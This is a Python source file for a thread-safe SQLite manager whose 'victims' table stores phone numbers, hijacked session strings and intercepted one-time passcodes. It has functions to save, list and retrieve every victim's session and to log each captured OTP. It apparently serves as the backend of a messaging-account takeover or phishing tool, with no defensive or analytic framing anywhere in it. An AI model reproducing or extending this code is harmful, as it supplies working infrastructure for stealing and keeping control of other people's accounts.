import sqlite3
import logging
import threading
import time
from queue import Queue, Empty

logger = logging.getLogger(__name__)

class DatabaseManager:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super(DatabaseManager, cls).__new__(cls)
                cls._instance._init_db()
            return cls._instance
    
    def _init_db(self):
        self.conn = sqlite3.connect('victims.db', check_same_thread=False, timeout=60.0)
        self.conn.execute("PRAGMA journal_mode = WAL")
        self.conn.execute("PRAGMA busy_timeout = 10000")
        self.conn.execute("PRAGMA synchronous = NORMAL")
        self._create_tables()
        self.request_queue = Queue()
        self.result_queues = {}
        self.is_running = True
        self.worker_thread = threading.Thread(target=self._process_requests, daemon=True)
        self.worker_thread.start()
        logger.info("✅ Database Manager Started!")
    
    def _create_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims
                    (phone TEXT PRIMARY KEY, 
                     session_string TEXT, 
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     last_otp TEXT,
                     last_otp_time TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS otp_requests
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     phone TEXT,
                     hash TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        self.conn.commit()
    
    def _process_requests(self):
        while self.is_running:
            try:
                # Process database requests
                request_id, function, args, result_queue = self.request_queue.get(timeout=1)
                try:
                    result = function(*args)
                    result_queue.put(('success', result))
                except Exception as e:
                    result_queue.put(('error', str(e)))
                self.request_queue.task_done()
            except Empty:
                continue
            except Exception as e:
                logger.error(f"❌ Database worker error: {e}")
                time.sleep(1)
    
    def _execute_request(self, function, *args):
        request_id = threading.current_thread().ident
        result_queue = Queue()
        self.result_queues[request_id] = result_queue
        self.request_queue.put((request_id, function, args, result_queue))
        
        status, result = result_queue.get(timeout=30)
        del self.result_queues[request_id]
        
        if status == 'error':
            raise Exception(result)
        return result
    
    # Database operations
    def save_victim_session(self, phone, session_string):
        def _save():
            c = self.conn.cursor()
            c.execute("INSERT OR REPLACE INTO victims (phone, session_string) VALUES (?, ?)", 
                     (phone, session_string))
            self.conn.commit()
            logger.info(f"✅ Session saved for {phone}")
            return True
        return self._execute_request(_save)
    
    def get_victim_session(self, phone):
        def _get():
            c = self.conn.cursor()
            c.execute("SELECT session_string FROM victims WHERE phone = ?", (phone,))
            result = c.fetchone()
            return result[0] if result else None
        return self._execute_request(_get)
    
    def get_all_victim_sessions(self):
        def _get_all():
            c = self.conn.cursor()
            c.execute("SELECT phone, session_string FROM victims")
            return c.fetchall()
        return self._execute_request(_get_all)
    
    def update_victim_otp(self, phone, otp_code):
        def _update():
            c = self.conn.cursor()
            c.execute("UPDATE victims SET last_otp = ?, last_otp_time = CURRENT_TIMESTAMP WHERE phone = ?", 
                     (otp_code, phone))
            self.conn.commit()
            logger.info(f"✅ OTP updated for {phone}: {otp_code}")
            return True
        return self._execute_request(_update)
    
    def get_victim_otp(self, phone):
        def _get_otp():
            c = self.conn.cursor()
            c.execute("SELECT last_otp, last_otp_time FROM victims WHERE phone = ?", (phone,))
            return c.fetchone()
        result = self._execute_request(_get_otp)
        return result if result else (None, None)
    
    def close(self):
        self.is_running = False
        self.conn.close()

# Global instance
db_manager = DatabaseManager()

# Compatibility functions
def save_victim_session(phone, session_string):
    return db_manager.save_victim_session(phone, session_string)

def get_victim_session(phone):
    return db_manager.get_victim_session(phone)

def get_all_victim_sessions():
    return db_manager.get_all_victim_sessions()

def update_victim_otp(phone, otp_code):
    return db_manager.update_victim_otp(phone, otp_code)

def get_victim_otp(phone):
    return db_manager.get_victim_otp(phone)

def init_db():
    # Already initialized in singleton
    pass
